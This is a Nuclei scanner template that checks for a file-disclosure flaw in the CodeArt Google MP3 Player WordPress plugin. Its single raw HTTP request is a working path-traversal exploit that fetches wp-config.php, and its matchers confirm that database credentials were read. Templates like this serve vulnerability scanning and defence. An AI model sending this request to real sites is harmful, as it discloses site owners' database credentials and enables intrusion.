id: wp-googlemp3-lfi

info:
  name: WordPress Plugin CodeArt Google MP3 Player - File Disclosure Download
  author: theamanrawat
  severity: critical
  description: |
    WordPress Plugin CodeArt Google MP3 Player allows an unauthenticated attacker to download file from server.
  reference:
    - https://www.exploit-db.com/exploits/35460
    - https://wordpress.org/plugins/google-mp3-audio-player/
  metadata:
    verified: "true"
    max-request: 1
    publicwww-query: "/wp-content/plugins/google-mp3-audio-player/"
  tags: wp-plugin,wp,wordpress,lfi,google-mp3-audio-player,unauth,disclosure

http:
  - raw:
      - |
        GET /wp-content/plugins/google-mp3-audio-player/direct_download.php?file=../../wp-config.php HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "DB_USER"
          - "DB_PASSWORD"
          - "DB_HOST"
        condition: and

      - type: word
        part: header
        words:
          - "application/octet-stream"

      - type: status
        status:
          - 200
# digest: 4b0a00483046022100b3cd3b9fadb4d627c5a8ee62e09ca335a21087f1f53c8da25d4aca4c290b999602210083768fa18779615fea8819bbb5f5602c20137a3a4084966faa59f6ecc0b26d8b:922c64590222798bb761d5b6d8e72950